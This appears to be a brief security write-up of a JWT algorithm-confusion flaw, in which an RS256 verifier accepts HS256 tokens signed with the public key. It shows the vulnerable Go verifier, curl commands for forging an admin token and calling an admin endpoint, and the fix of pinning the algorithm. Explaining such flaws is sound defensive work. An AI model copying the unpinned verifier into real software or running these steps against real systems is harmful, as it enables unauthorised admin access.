## Context

The target was a B2B SaaS platform issuing RS256 JWTs. The verification routine looked correct — until you fed it the public key and asked it to do HS256.

## The Invariant That Broke

The assumption: `alg` field in the JWT header is trusted.

```go
func Verify(token string, key []byte) (*Claims, error) {
    parsed, err := jwt.Parse(token, func(t *jwt.Token) (interface{}, error) {
        return key, nil
    })
    if err != nil { return nil, err }
    return parsed.Claims.(*Claims), nil
}
```

The verifier never pinned the algorithm. Swapping `alg` to `HS256` and signing with the publicly-exposed RSA public key produced a token the server happily accepted.

## Exploitation

```bash
curl https://target/.well-known/jwks.json | jq -r '.keys[0]' > pub.json
python3 forge.py --pub pub.json --alg HS256 --sub admin > token.jwt
curl -H "Authorization: Bearer $(cat token.jwt)" https://target/api/admin/users
```

## Lesson

Never trust `alg`. Pin it server-side.
